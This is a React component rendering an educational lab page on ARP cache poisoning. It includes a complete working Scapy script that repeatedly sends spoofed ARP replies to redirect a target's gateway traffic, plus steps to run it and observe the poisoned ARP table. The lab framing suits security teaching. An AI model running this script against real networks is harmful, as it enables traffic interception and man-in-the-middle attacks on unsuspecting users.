import React from "react";

const ArpCacheMeOutside = () => {
    return (
        <div>
            <h1>ARP: Cache' Me Outside</h1>

            <div className="section">
                <h2>Objective</h2>
                <p>
                    In this lab, you’ll perform an <strong>ARP cache poisoning</strong> attack in a controlled environment to understand how it works and observe its effects on a network.
                </p>
            </div>

            <div className="section">
                <h2>Prerequisites</h2>
                <ul>
                    <li>
                        Ensure you have <strong>Python</strong> installed on your system.
                        <ol>
                            <li>
                                To check if Python is installed, open a terminal and type:
                                <code style={{ backgroundColor: "#ced4da", padding: "2px 4px", borderRadius: "4px" }}>python --version</code>
                            </li>
                            <li>
                                If Python is installed, you will see the version number (e.g., 
                                <code style={{ backgroundColor: "#ced4da", padding: "2px 4px", borderRadius: "4px" }}>Python 3.8.10</code>).
                            </li>
                        </ol>
                    </li>
                    <li>
                        Verify that you have the <strong>Scapy</strong> library installed, which is necessary for sending ARP packets.
                        <ol>
                            <li>
                                To check if Scapy is installed, type:
                                <code style={{ backgroundColor: "#ced4da", padding: "2px 4px", borderRadius: "4px" }}>python -c "import scapy"</code>
                            </li>
                            <li>
                                If there’s no error message, Scapy is installed. If you see an error, follow instructions from your instructor to install Scapy.
                            </li>
                        </ol>
                    </li>
                    <li>
                        Work within a <strong>virtualized or isolated lab environment</strong> to avoid affecting any production network.
                    </li>
                </ul>
            </div>

            <div className="section">
                <h2>Steps</h2>

                <h3>Step 1: Understand ARP (5 Minutes)</h3>
                <p>
                    Review the basics of <strong>ARP</strong>: it’s used to map IP addresses to MAC addresses on a local network. Think about why ARP is important for devices to communicate on the same network.
                </p>

                <h3>Step 2: Lab Setup (5 Minutes)</h3>
                <p>Visualize our setup: We have two devices on a local network.</p>
                <ul>
                    <li><strong>Attacker:</strong> Your computer, where you’ll run the ARP poisoning script.</li>
                    <li><strong>Target:</strong> The device we will try to poison.</li>
                </ul>
                <p>
                    Confirm your teacher has given you the <strong>IP address</strong> and <strong>MAC address</strong> of the target device.
                </p>

                <h3>Step 3: Write the ARP Poisoning Code (15 Minutes)</h3>
                <ol>
                    <li>
                        Open a new Python file or script editor and name the file
                        <code style={{ backgroundColor: "#ced4da", padding: "2px 4px", borderRadius: "4px" }}>arp_poison.py</code>.
                    </li>
                    <li>Enter the following code into the file:</li>
                </ol>
                <pre style={{ backgroundColor: "#f8f9fa", padding: "10px", border: "1px solid #ced4da", borderRadius: "10px" }}>
{`from scapy.all import *
import time

def arp_poison(target_ip, target_mac, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    print(f"Sending ARP replies to {target_ip}, spoofing {spoof_ip}.")
    try:
        while True:
            send(packet, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("ARP poison attack stopped.")

# Replace with target IP, MAC, and gateway IP addresses
target_ip = "192.168.1.10"       # Enter your target's IP address
target_mac = "00:11:22:33:44:55" # Enter your target's MAC address
spoof_ip = "192.168.1.1"         # Enter the IP you want to spoof (e.g., the gateway IP)

arp_poison(target_ip, target_mac, spoof_ip)`}
                </pre>
                <ol>
                    <li>Replace <code>target_ip</code>, <code>target_mac</code>, and <code>spoof_ip</code> with the appropriate values given by your teacher.</li>
                    <li>Save the file.</li>
                </ol>

                <h3>Step 4: Run the ARP Poisoning Script (10 Minutes)</h3>
                <ol>
                    <li>
                        Open a terminal (or command prompt) and navigate to the directory where you saved
                        <code style={{ backgroundColor: "#ced4da", padding: "2px 4px", borderRadius: "4px" }}>arp_poison.py</code>.
                    </li>
                    <li>
                        Run the script using the command:
                        <code style={{ backgroundColor: "#ced4da", padding: "2px 4px", borderRadius: "4px" }}>python arp_poison.py</code>
                    </li>
                    <li>
                        Check the ARP table on the target machine (the one we’re spoofing). On the target device, open a terminal or command prompt and type:
                        <ul>
                            <li><strong>On Windows:</strong> <code style={{ backgroundColor: "#ced4da", padding: "2px 4px", borderRadius: "4px" }}>arp -a</code></li>
                            <li><strong>On Linux/Mac:</strong> <code style={{ backgroundColor: "#ced4da", padding: "2px 4px", borderRadius: "4px" }}>arp -n</code></li>
                        </ul>
                    </li>
                    <li>
                        Observe the entries in the ARP table. The IP address you specified to spoof (e.g., the gateway) should now be associated with your MAC address (the attacker’s MAC).
                    </li>
                </ol>

                <h3>Step 5: Stop the Script and Discuss (10 Minutes)</h3>
                <ol>
                    <li>
                        Stop the script by pressing <code style={{ backgroundColor: "#ced4da", padding: "2px 4px", borderRadius: "4px" }}>Ctrl + C</code> in the terminal where it is running.
                    </li>
                    <li>In your ARP table, check that the ARP entry on the target device has returned to its original state.</li>
                </ol>
            </div>

            <div className="section">
                <h2>Questions for Reflection</h2>
                <ol>
                    <li>What did you observe in the ARP table of the target device during the attack?</li>
                    <li>Why do you think ARP poisoning is a security risk?</li>
                    <li>Can you think of ways to protect against ARP cache poisoning?</li>
                </ol>
            </div>

            <h2>End of Lab</h2>
        </div>
    );
};

export default ArpCacheMeOutside;
